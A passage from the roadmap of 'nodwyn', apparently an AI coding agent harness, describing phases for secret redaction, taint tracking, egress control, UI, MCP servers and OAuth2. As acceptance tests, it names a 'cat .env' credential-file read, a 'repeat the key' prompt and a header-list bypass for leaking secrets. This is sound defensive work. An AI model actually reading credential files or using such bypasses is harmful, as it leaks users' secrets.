- **Done 2026-09-22.** Tags initially used an interned 64-bit set with overflow after 63 names. **Readability amendment, 2026-09-22:** tags now use immutable sorted name sets, removing the global registry and preserving exact external-source and credential-class attribution beyond 63 names. Constructors and unions own their storage; returned names are copies. Propagation lives in one function in the primitive dispatch; host primitives declare their source; handles carry `cred:<class>`; primitives that *measure* rather than carry opt out explicitly. `guard.Taint` runs before L1 so that when L2 knows, the learned layer is not paid for. Three additions beyond the plan, each earned by a case the plan did not name: `deepTaint` looks inside lists, because a header list assembled cleanly from tainted strings is the obvious bypass; an argv built from tool output is a **security confirm** that a standing command approval cannot waive, because the approval was for a command, not for whatever a file contains; and `taint-of`/`tainted?` exist so provenance is inspectable from Scheme. Exfil scenarios 010–012. Tag `v0.8-taint` (numbering drifted from the plan's names; see git tags).

### Phase 7 — Ingress redaction E2/E4 (weeks 16–17)

- `internal/redact`: `Redact(text) (string, []Event)` via L1 (+L3 when present) → `[REDACTED <class>]`.
- Installed on **the single context-ingress function** (`context.Append`); CI grep-lint asserts no other writer. E2: every tool result. E4: prompts, pastes, `$EDITOR` input, env-derived text. Same redactor in front of the log writer.
- **With nodwyn:** promotion retires the last two operator rules in §3.3. nodwyn is now safe to use on *other* repos with real keys. From here, curated session logs go into `test/sessions/` as replay fixtures for P10.
- **Accept:** canary paste ⇒ context and log show `[REDACTED anthropic-key]`; `cat .env` ⇒ redacted before the model sees it; "repeat the key" ⇒ placeholder only; full exfil suite green. Promote `v0.7-core`.

- **Implemented 2026-09-22; promoted as `v0.9-core`.** `Session.Record` is the existing
  log-derived context ingress (no separate mutable context store). It sanitizes
  typed payloads, emits substitution metadata, and retains only written events;
  the log writer independently redacts after custom filters. User input is
  recorded before the plan gate; direct planner requests, tool schemas, and
  frontend payloads are covered. Model responses are buffered to detect keys
  split across chunks (ADR 25). Tests cover paste, `cat .env`, repeat-key context,
  replay, JSON escaping, and planner/output bypasses. `make accept` and the live
  candidate selfcheck passed. The selfcheck log in `test/sessions/` is genuine
  acceptance evidence, not a nodwyn-authored build session.

**Milestone M3 (end of week 17): all four edges guarded — v0-core. The 3–4-month cut.** If the budget ends here nodwyn is usable in line mode with the full security model, and has been building itself for 13 weeks.

### Phase 8 — L3 feature classifier, optional (weeks 18–19)

- `internal/detect/l3`: features → logistic regression, weights embedded; Platt calibration → `P(secret)`. Invoked only on the residual; combines with binding (`P > τ ∧ unbound ⇒ Confirm`); never allows or denies alone. Build tag `nol3`.
- `tools/l3train`: public secrets corpus + synthetic negatives + nodwyn's own confirmed events.
- **With nodwyn:** the confirmed-event file already has weeks of entries from the build sessions — the "own events" training set is real from day one.
- **Accept:** ECE < 0.05; < 5 ms per 4 KB; exfil suite green under both build tags. Promote `v0.8-l3`.
- **Not started.** Optional; a secret whose shape L1 does not know stays a residual that only binding covers.

### Phase 9 — TUI (weeks 20–22; implemented 2026-09-22)

- **Implemented:** opt-in `nodwyn tui`, direct-core and daemon adapters,
  startup session selection/resume, streaming conversation and tool/guard results,
  scrollable approvals, budget replies, masked credential entry, user Scheme,
  resize, abort and explicit reconnect. See [the TUI guide](docs/tui.md).
  Read-only `:log`, `:bindings`, `:replay` and guarded `:friction` inspectors are
  also implemented, with fixed snapshots and prompt priority.
  The multiline composer preserves pasted line breaks and drafts across prompts
  and reconnects; Enter sends, Alt+Enter/Ctrl+J inserts a newline.
  Tool discovery (`:tools [name]`) and plain-mode help/quit/approval-list aliases
  are implemented using existing session metadata.
  Tool calls now group arguments, recorded guard decisions and full results,
  reconstructing the same view from history and live events.
  Plan and budget inspectors show recorded gate outcomes, configured limits and
  latest-turn checkpoints; live counters are not exposed. Checkpoint prompts
  show all four usage dimensions. Credential-bearing confirmations now show
  class, destination, method and position; missing facts are explicit. This is
  paired with an explicit `b` action for eligible exact binding proposals. Core
  persists and audits the row; all sessions reload policy before egress. Plain
  mode remains the default. Line-mode flow parity is verified; the acceptance
  matrix and regression pointers are in [the TUI guide](docs/tui.md).
- `internal/frontend/tui`: a bubbletea program over `core.Session` — no new core code; if P9 needs a core change, that is a gap in ADR 10 and gets an ADR amendment, not a shortcut.
- Views: streaming transcript; tool-call cards with guard badge; plan panel; confirm modal naming class + destination + scope with "bind this"; masked credential input; `:log :bindings :replay :friction`.
- **With nodwyn:** friction.md is the backlog, ranked by frequency. Line mode stays as `nodwyn --plain` — it is still what CI and `selfcheck.sh` use.
- **Accept:** every line-mode flow works in the TUI; resize; Ctrl-C mid-`shell-exec` leaves no orphan. Promote `v0.9-tui`.
- **Shape change (ADR 21):** if U2 (the daemon and its protocol) lands first, the TUI is written as the protocol's first client — same package, same views, attaching to `nodwynd` when a socket is given and running in-process otherwise.

### Phase 10 — Memory (implemented 2026-09-22)

- **Implemented:** new session runtimes record their window recipe and each turn
  request records a digest. `nodwyn replay SESSION --window SEQ` verifies exact
  reconstruction without using current configuration or contacting a model.
  Legacy logs explicitly report missing reconstruction data. User-authored
  summaries now have validated source spans, inspection and append-only
  revocation; versioned windows retain historical replay and recent turns stay
  outside summary replacement. Existing token caps remain. Session-scoped
  retrieval is exposed through guarded `index-grep` (ripgrep listed its
  files until 2026-09-30; a Go walk does now), an on-demand,
  bounded view with no persistent index; see [memory controls](docs/memory.md)
  for explicit scope. Tree-sitter outlines (`index-symbols`) shipped here and
  were removed on 2026-09-27: unused by models, and dependent on vendored
  grammar binaries.

- Replace the naive window with the spec's: recent turns verbatim, older spans replaced by their latest `summary` log event; `nodwyn summary --drop <seq>` revokes and recomputes.
- Session index: tree-sitter symbols + ripgrep search exposed as prims (`index-symbols`, `index-grep`) — surgical pull, the model asks. (`index-symbols` and its vendored grammars were removed on 2026-09-27; `index-grep` remains.)
- **With nodwyn:** `test/sessions/` holds real logs of nodwyn building nodwyn since P7; window and summary policies are designed and tested against them, not synthetic transcripts.
- **Accept:** `nodwyn replay` reproduces the window byte-for-byte; dropping a summary changes the window deterministically; no cross-session state on disk except the log. Promote `v0.10` = **v0**.

---

### After v0 — a real UI (ADR 21)

The core is already UI-agnostic (ADR 10) and a CI lint keeps it that way, so
this is additive work, not a refactor. Four phases, each useful alone:

- **U1 — resume and the session store (implemented 2026-09-22).** `core.Resume(options, id)` rebuilds
  from the log (the window is already a fold over events); `core.Store` lists
  sessions; `nodwyn --resume <id>`. Top item in friction.md; everything later
  assumes it.
- **U2 — `nodwynd` and the local protocol (implemented 2026-09-22).**
  `nodwyn daemon` owns sessions over a 0600 Unix socket: lifecycle, send/abort,
  user Scheme evaluation, event subscriptions and paged log catch-up, attributed
  approval/credential replies, explicit standing approvals and approval inspection.
  [The protocol guide](docs/protocol.md) and generated schema define the wire
  contract. Kernel peer credentials identify answerers; resuming never restores
  transient authority. Optional TCP/token transport remains deferred.
  **P9 uses this protocol**; its terminal views and line-mode flow parity are implemented.
- **U3 — the desktop client (implemented).**
  `nodwyn ui` now serves embedded assets over a paired loopback WebSocket bridge
  to the existing daemon. Session lists, fixed-prefix transcript catch-up, live
  text/tool/guard output, creation/resume/send/abort/close, and an explicit
  server-enforced read-only mode are implemented; see
  [the browser guide](docs/browser.md). Pending reason/diff panels, one-time
  replies, masked credential acquisition and budget checkpoint replies are also
  implemented. Session/turn approval choices and exact persistent binding controls
  use core-derived scope metadata. Fixed plan/budget/log/policy/tool inspectors are
  implemented, along with the guarded friction-file view and revision-checked,
  confirmed edits to shared bindings and repository approval files. Approval-file
  changes take effect for new/resumed sessions; binding changes reload before
  egress. The intended full scope is a local web UI backed by `nodwynd`
  (`nodwyn ui`), assets embedded in the binary. Views in order: session list,
  transcript, **approvals** (the diff panel is what justifies a GUI), plan and
  budgets, inspectors for the log, bindings and standing approvals.
- **U4 — multi-session and background runs (in progress).** Cross-session attention
  indicators and opt-in generic desktop notifications are implemented. The bounded
  supervised run driver is implemented with required plans, finite wall/turn limits,
  checkpoint replies, and explicit resume at recorded turn boundaries; see
  [runs](docs/runs.md). Unattended tool approval exists (`--yolo`, a run's
  `auto_approve`). Of the original scope — several sessions at once, the ADR 18
  run driver with checkpoints as notifications, desktop notifications for
  "needs your approval" — only unattended continuation between a run's turns
  remains.

Accepted risk: the socket is an approval surface. 0600 in the runtime dir, no
TCP by default, client identity in every decision, and creating a standing
approval over RPC needs its own explicit method.

### After v0 — cowork: workspaces, attachments, MCP (ADR 22, ADR 23)

Status (2026-09-30): W1, W2 (text), W3a and W4 are implemented, W1–W3a as
D6–D8 below. Images, W3b and W5 are not.

The same harness, applied to work that is not only code, for **one person**
(collaboration is out of scope). The invariants do not change; three
assumptions do — the pin (one root, git as undo), ingress (attachments are
content from outside), and the metadata contract (MCP tools declare none of
what the guard reads).

- **W1 — workspaces, mounts, undo (≈1 week).** `RepoPin` generalizes to a
  root plus a user-owned **mount table** (`path → read|write`), the
  filesystem counterpart of the binding table; `.nodwyn/` stays protected. A
  **version store** (`.nodwyn/versions/`, content-addressed, capped) is written
  before every irreversible write, with `nodwyn undo`/`nodwyn versions` — this is
  what keeps ADR 17's standing write approvals honest where there is no git.
  A workspace is a plain folder; if the user syncs it, nodwyn makes no
  assumption about locking or conflicts. A `kind` (`code`/`docs`/`mixed`)
  picks default tools and framing, never policy.
- **W2 — attachments, text and images (≈1.5 weeks, needs P7).** `nodwyn attach
  FILE` copies into `.nodwyn/attachments/`, extracts text by type (PDF, docx,
  xlsx, pptx), **redacts at ingest** through the P7 controller, caps size,
  logs `attach`, and tags the text `external` for L2. **Images go in as
  images**: the control plane reports `vision` and reads
  `images: [base64]` (verified 2026-09-22 against workshop). That means an
  image is *not redactable* — the fence around it is that the control plane
  is local, that images are never sent to Jev, and that attaching one has
  its own confirm saying so. Per-image token accounting, since bytes/3 is
  meaningless for pixels.
- **W3a — remote MCP servers (≈1 week, needs P3).** An MCP tool becomes a
  primitive named `server/tool`, crossing the guard like `fs-read`. Because
  MCP declares no `egress`/`irreversible`/roles, the server carries a
  **capability profile**, and **an undeclared tool is egress *and*
  irreversible** — confirm every call, deny unbound egress. A remote server
  is just a destination in the binding table, so this phase is mostly a
  JSON-RPC client plus the profile. Manifest hashes are pinned: a changed
  tool description stops the session until re-approved (ADR 23).
- **W3b — contained local servers (≈2 weeks, needs W3a).** Servers nodwyn
  cannot review never run in its process tree: a local server runs in a
  digest-pinned container with a declared network (`[]` = none) and declared
  workspace mounts (default none), reached over loopback HTTP. A container
  runtime becomes an optional dependency; without one, remote servers still
  work. See ADR 23 for the full posture and its accepted limits.
- **W4 — OAuth2 credentials (≈1.5 weeks, extends P3; ADR 24).** ADR 5 stores
  one static value; OAuth2 is a token set that expires, rotates, and is
  acquired through a browser. A credential gains a kind (`static` |
  `oauth2`); acquisition is Authorization Code + PKCE over a single-shot
  loopback listener, user-origin only; **refresh happens inside the keychain**
  — authorized by the same binding row that authorizes use, serialized per
  credential, logged as `cred.refresh`, never interactive (a dead refresh
  token marks the credential `needs_reauth` and denies). Binding rows may
  name `scopes`, and every confirm involving an oauth2 credential names
  class, destination *and* scopes. Provider profiles ship narrow default
  scopes. **Done 2026-09-30** (ADR 24, "Implemented"): `nodwyn credential
  add --oauth2 | login | revoke | list`, profiles for Google, Microsoft,
  GitHub and Notion plus custom endpoints, a lock shared by every process
  holding the keychain, `cred.refresh`, and scopes in bindings and confirms;
  tested against a fake provider. MCP's own authorization discovery and
  dynamic client registration are not done.
- **W5 — documents in and out (≈1.5 weeks, needs W4).** LaTeX through the
  installed toolchain (`shell-exec` + a standing approval — the book already
  proves it), docx via pandoc from Markdown or LaTeX, Google Docs through its
  API on an OAuth2 credential.

**One product** (agreed 2026-09-22, amended 2026-09-30). One core, one
binary, one protocol (ADR 21). A workspace `kind` (code or docs) is a label
the console shows; every kind has the same tools and the same guard, and
`session.eval` works in every workspace. (The first version of this decision
had docs workspaces drop `shell-exec`, `register-tool` and Scheme evaluation;
ADR 22's amendment removed that, because a self-extending agent defines its
own tools wherever it works.) The desktop window, the browser, the phone and
the TUI are front-ends over the same protocol. Only a distribution
constraint — a sandboxed bundle that cannot run a daemon or a container —
would force a second product.

Accepted limit (ADR 22): **nodwyn controls where content goes, not what content
means.** L1/L3 detect credentials; nothing in nodwyn recognises a contract or a
medical letter. The protections that apply to those are the mount table, the
confirm, the binding table and the Jev content level.

### After v0 — converging on the design canvas (ADR 21 amendment, ADR 30)

The canvas linked from ADR 21 is the target. Requirements added on
2026-09-30: remote work stays a browser, and a **standalone app** must run
without anyone managing a daemon, because nodwyn will be shared with family.
Each step is independently useful and lands with tests and docs.

- **D1 — console foundation.** New design tokens (canvas palette, light and
  dark), embedded OFL fonts, a hash router, the task-oriented shell: sidebar
  with New task / Needs you / Running / Recent, Connections / Workspaces /
  Settings, model status footer. Phone width is a first-class layout.
- **D2 — data the views need, from sources that exist.** `attention.list`
  (redacted pending prompts across open sessions, for Home cards);
  session titles, change counts and workspace names in `session.list`
  (with a list cache keyed by file size and mtime, since List rereads every
  log); `models.status` (reachability of configured models); project notes
  read/edit through a fixed user-origin guarded operation; run progress in
  the list. Live budgets are counted from the log, not invented.
- **D3 — Home and Task views.** Home: composer with workspace chips,
  Needs-you cards with one-tap Allow once, Running cards with run progress,
  Recently finished. Task: grouped read-only tool calls ("Looked around"),
  command chips, safe Markdown for replies (DOM nodes, never innerHTML),
  the approval inline with a line-numbered diff and Y/T/A/N keys, and the
  aside (plan, this turn, changes, project notes, workspace). U3
  inspectors move under a task's Details.
- **D4 — the standalone app.** `nodwyn app`: attach to a running daemon or
  own one in-process; launch-ticket pairing; keychain status/create/unlock
  and model settings over the protocol (local bridges only); first-run
  setup screen; native window with the `webview` tag and `make app` for
  `Nodwyn.app`; browser fallback without it.
- **D5 — remote devices.** `nodwyn ui --listen ADDR`, named device pairing
  with hashed revocable tokens (`nodwyn devices`), `via` in hello so audit
  names the device, policy writes refused from remote devices, optional
  TLS. The phone approval view.
- **D6 — workspaces (W1).** Named workspace registry, `kind`, mount table
  in `.nodwyn/workspace.toml` enforced by the pin, version store before
  writes where there is no git, `nodwyn versions`/`nodwyn undo` and restore
  from the UI; every kind has the same tools (ADR 22, amended
  2026-09-30). Home's "Work in" chips and
  "Add a folder" (native chooser in the app).
- **D7 — attachments (W2, text first).** Composer attach → daemon
  `session.attach`: copy into `.nodwyn/attachments/`, deterministic
  extraction (text formats; docx/xlsx/pptx in Go; PDF via `pdftotext` when
  installed), redact at ingest, cap, log `attach`, enter the next message as
  data. Images wait for vision plumbing.
- **D8 — MCP servers over HTTP (W3a).** Capability profiles, undeclared =
  egress + irreversible with no standing answer, manifest pinning, tools as
  `server/tool` primitives frozen per session, credentials through the
  binding table; the Connections page with per-tool profiles, manifest
  review and per-workspace enablement.
- **D9 — contained local MCP servers (W3b), stretch.** Docker-backed, per
  ADR 23.

Order: D1–D3 make the design real on today's capabilities; D4 is the family
requirement and comes next; D5 is small once D4's pairing exists; D6–D8
are the cowork track the canvas assumes.

Status (2026-09-30): **D1–D8 implemented** and merged into `main`, each
with Go tests and a browser flow (test/browser). D9 is not started: honoring a
per-host network allowlist inside a container needs an egress proxy, and
half-isolation would be worse than none. Also open: images as attachments
(vision plumbing) and W5 documents out (W4 OAuth2 and plan step progress are done). What
comes next is §10.

### Outside the plan — what running it taught (2026-09-26 to 2026-09-30)

Running nodwyn unattended on a SWE-bench Verified cohort, and daily use,
produced work no phase had planned. Each item came from a failure recorded in
friction.md:

- **The loop is a Scheme procedure** (ADR 26): trying a plan cycle, a judge
  check or a stop-at-first-failure batch meant editing Go; now it is
  `agent-turn` in `.nodwyn/init.scm`, over primitives that keep the
  invariants.
- **Configured models and narrowed contexts** (ADR 27): a strategy can ask
  another model by name over only the task and the plan.
- **A scratch directory** (ADR 28): writes to `/tmp` were refused, so throwaway
  scripts ended up in the repository.
- **Optional tool parameters** (ADR 29).
- **Unattended runs**: `--yolo` for ordinary confirms (never security
  confirms), the keychain held by the daemon, retries of failed model
  requests, a cap on each reply.
- **The default loop's working habits** (ADR 32): the combination that
  resolved 86 of 121 benchmark tasks became the default, with compaction on.
- **Background processes, read-only git tools, `index-grep` and `fs-find`
  without ripgrep.**
- **The rename to nodwyn** (ADR 31) and **Go 1.26 as the base** (ADR 33).
- **The egress gaps the book audit found** (2026-09-30): MCP arguments
  outside L1 and L2 and untagged MCP results; keyed and model requests that
  followed redirects; and the judge's primitives offered to the model, which
  could never call them for want of a handle. They are hidden now, and the
  model has `judge-noul`, `judge-score` and `judge-choice`, which carry the
  stored `jev-key`, at `jev.content = "full"` (ADR 20, amended).
- **Plan step progress** (2026-09-30): the model marks the plan's steps done
  or skipped with `plan-step`, recorded as `plan.step`; the console's plan
  panel and the TUI's `:plan` show which are done, skipped and next.

## 6. Timeline at a glance

The weeks are the original estimate; the last two columns are what happened.

| Planned weeks | Stage / phase | Milestone | Shipped as | Date |
|---|---|---|---|---|
| 1–4 | **Bootstrap** B0–B3 (external harness) | **M0 self-hosting** | `v0.1-bootstrap` | 2026-09-21 |
| 5–6 | P1b Kernel growth | | `v0.3-kernel` | 2026-09-21 |
| 7–9 | P3 Credentials | | `v0.4-creds` | 2026-09-21 |
| 10–11 | P4 L1 | **M2 safe with real keys** | `v0.5-l1` | 2026-09-21 |
| 12–13 | P5 Plan gate | | `v0.6-plan` | 2026-09-22 |
| 14–15 | P6 L2 taint | | `v0.8-taint` | 2026-09-22 |
| 16–17 | P7 Redaction | **M3 v0-core** | `v0.9-core` | 2026-09-22 |
| 18–19 | P8 L3 (optional) | | not started | |
| 20–22 | P9 TUI | | `v0.17-tui` … `v0.26-tui-parity` | 2026-09-22 |
| 23–24 | P10 Memory | **v0** (without L3) | `v0.27-window-replay` … `v0.30-memory` | 2026-09-22 |
| after v0 | U1 resume, U2 daemon | | `v0.11-resume`, `v0.14-daemon` … `v0.16-approvals` | 2026-09-22 |
| after v0 | U3 browser, U4 attention and runs | | `v0.31-browser-view` … `v0.41-supervised-runs` | 2026-09-22 |
| after v0 | Console rebuild | | `v0.42-console` | 2026-09-25 |
| after v0 | D1–D8 (console, app, devices, workspaces, attachments, MCP) | | commits on `main`; promotion no longer tags | 2026-09-30 |

Cut order, as planned: P10 → P8 → P9 polish (keep `--plain`). Never cut B0–B3 or P3–P7. Only P8 was cut.

---

## 7. Cross-cutting discipline

- **Exfil scenario suite (`test/exfil/`)** is the project's most important artifact: Scheme script + expected `Decision` + post-condition that a seeded canary appears in none of log, context dump, captured Jev payloads, stdout. Grows every phase; required for promotion.
- **Selfcheck (`scripts/selfcheck.sh`)** is the second gate: the candidate binary must complete a scripted session on this repo before it can become stable.
- **Structural checks in CI:** the kernel-fixed hash after loading `.scm` (`TestKernelFixed`); the single context ingress (`scripts/lint-ingress.sh`); the single Scheme→Go exit (`applyPrim` is the only `Prim.Handler` call, held by `TestGateIsTheSingleExit`); the core/front-end boundary (`scripts/lint-boundaries.sh`, ADR 10).
- **Fuzzing:** reader and L1 from day one.
- **Fakes, not mocks:** a fake Ollama (`/api/chat` streaming, scripted tool calls), a fake Jev and a fake MCP server under `test/fakes/`. `make smoke` runs a two-turn session against the configured control model and is manual, not CI.
- **friction.md** is reviewed at every promotion; the top three items are candidates for the next phase's side-work.
- **ADR per decision**; SPEC.md is amended, not contradicted.

---

## 8. Risk register

| # | Risk | Mitigation |
|---|---|---|
| 1 | **Dogfood tax, amplified by a 27B local model:** weeks 5–8 are slower than hand-coding and the model will need small, explicit tasks | Expected and bounded; fallback is allowed (ADR 16); friction.md turns the cost into the P9/P10 backlog; if evidence says the model is the bottleneck on P6/P7, switch the control plane to a keyed frontier provider via `nodwyn-control` (config change after P3) |
| 1b | **Single inference slot on workshop** shared with other clients; long cold prompt evals | Streaming + generous timeouts + abort frees the slot; ADR 9 keeps the prefix cache warm; `keep_alive` is 30 m so the model stays resident between turns |
| 2 | **Broken stable strands development** | ADR 12/13: two binaries, selfcheck before promotion, `nodwyn-stable.prev` rollback; verify rollback deliberately in P6 |
| 3 | **Bootstrap envelope hole (`shell-exec` reading outside the repo)** | Argv trigger + operator rules until P7; scrubbed child env stays forever; no secrets on the build machine's repo |
| 4 | Interpreter scope creep | ADR 7 scope freeze; bootstrap kernel is minimal by design, P1b is the only growth window |
| 5 | Taint representation chosen late | `Taint` reserved in B1; propagation implemented once in dispatch |
| 6 | Confirm loop becomes a rubber stamp (spec Risk 2) | Default Deny; confirm names class + dest + scope and offers a binding row |
| 7 | Jev latency/outage on every message | Cache noul per user message; 2 s timeout; degrade to "plan"; hard trigger independent |
| 8 | L1 false positives make the daily driver annoying | Allowlist; per-class tuning on nodwyn's own repo; confirmed events feed L3 |
| 9 | Secret leaks via an unexpected path (error, panic, debug print) | Canary-grep post-condition in every exfil scenario; handles print opaque; keychain value type has no `String()` |
| 10 | Single developer, hard deadline | Phase gates with promotion; cut order defined |

Rows 1, 1b and 3 describe the bootstrap. The control model is now configured per machine, keyed providers included, so the 27B model and workshop's single slot are one setup among others. The `shell-exec` hole in row 3 is permanent in a narrower form: the guard sees a command line, not what a confirmed program does.

---

## 9. Open questions

Resolved:

- Module path: `github.com/fclaude/nodwyn`. No Scheme interpreter existed; B1 wrote a minimal, documented subset from scratch (ADR 7).
- 3. **Where `nodwyn-stable` lives:** `~/.local/bin`, or `NODWYN_STABLE_DIR`.
- 4. **Keychain backend:** a passphrase-encrypted file (ADR 5); no OS keyring.
- 5. **Unbound egress default:** Deny (ADR 6). `policy.unbound = "confirm"` is opt-in, and then the confirm can save the exact binding row.
- 6. **Jev credential** — *resolved by ADR 20*: bound data-plane credential, guarded and logged like any other egress.
- 7. **Frontier providers:** an OpenAI-compatible chat-completions provider exists and can be the control model or any `[models.NAME]`, its key bound like any other. No Anthropic Messages provider, and no `nodwyn-control` class.

Still open:

8. **Ollama version drift** — the live server is 0.34.2 while the compose file pins 0.34.0 by digest. Not a nodwyn problem, but worth a note in `infra`.

---

## 10. What is next

In this order, each for the reason given:

1. **Images as attachments.** Needs vision plumbing in the model clients, the confirm that says an image cannot be redacted, and per-image token accounting (ADR 22 §3).
2. **U4 — unattended continuation between a run's turns.** Tool confirms can already be answered unattended; the turn-to-turn checkpoint still needs a person.
3. **W5 — documents out** (docx via pandoc, Google Docs on W4's OAuth2).
4. **W3b/D9 — contained local MCP servers.** Blocked on an egress proxy that can enforce a per-host allowlist inside the container; half-isolation would be worse than none.
5. **P8 — L3**, optional.

Dated: raise the Go base to 1.27 once Fedora 45 ships it (due 2026-10-20) and a 1.27 feature is worth having (ADR 33).
